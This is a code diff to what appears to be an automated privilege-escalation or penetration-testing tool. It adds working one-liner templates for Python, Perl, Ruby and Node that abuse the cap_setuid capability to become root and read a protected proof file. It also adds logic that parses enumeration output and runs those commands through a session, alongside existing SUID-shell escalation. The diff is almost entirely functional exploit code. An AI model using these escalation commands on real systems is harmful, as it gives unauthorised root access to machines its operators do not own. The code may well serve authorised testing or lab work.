@@ -81,6 +81,17 @@ _GROUP_ESCALATIONS = {
 # SUID shells: a root-owned SUID shell is an instant root read via -p.
 _SUID_SHELLS = ("bash", "sh", "dash", "ash", "zsh", "ksh")
 _SUID_PATH_RE = re.compile(r"^(/\S+)$")
+
+# cap_setuid on a scriptable interpreter -> setuid(0) then read. Keyed by the
+# interpreter base name; {PATH} is the exact binary, {P} the proof file.
+_CAP_SCRIPTABLE = {
+    "python": "{PATH} -c 'import os;os.setuid(0);print(open(\"{P}\").read())'",
+    "perl": "{PATH} -e '$>=0;print`cat {P}`'",
+    "ruby": "{PATH} -e 'Process::Sys.setuid(0);puts File.read(\"{P}\")'",
+    "node": ("{PATH} -e 'process.setuid(0);"
+             "console.log(require(\"fs\").readFileSync(\"{P}\",\"utf8\"))'"),
+}
+_CAPSETUID_RE = re.compile(r"^(/\S+)\s.*cap_setuid", re.IGNORECASE)
 _SUDO_ALL_RE = re.compile(r"\(\s*ALL(?:\s*:\s*ALL)?\s*\)\s*(?:NOPASSWD:\s*)?ALL\b", re.IGNORECASE)
 _NOPASSWD_BIN_RE = re.compile(r"NOPASSWD:\s*(.+)", re.IGNORECASE)
 
@@ -119,6 +130,21 @@ def attempt_escalation(session: Session, enum_output: str, findings: list[Findin
             path = m.group(1)
             r = _try(session, f"{path} -p -c 'cat {_ROOT_PROOF}'",
                      f"SUID {path.rsplit('/', 1)[-1]}", runner)
+            if r.escalated:
+                return r
+
+    # 5) cap_setuid on a scriptable interpreter -> setuid(0), then read.
+    for line in enum_output.splitlines():
+        m = _CAPSETUID_RE.match(line.strip())
+        if not m:
+            continue
+        path = m.group(1)
+        binary = path.rsplit("/", 1)[-1]
+        base = re.sub(r"[\d.]+$", "", binary)   # python3.9 -> python
+        tmpl = _CAP_SCRIPTABLE.get(base) or _CAP_SCRIPTABLE.get(binary)
+        if tmpl:
+            cmd = tmpl.replace("{PATH}", path).replace("{P}", _ROOT_PROOF)
+            r = _try(session, cmd, f"cap_setuid on {binary}", runner)
             if r.escalated:
                 return r
 
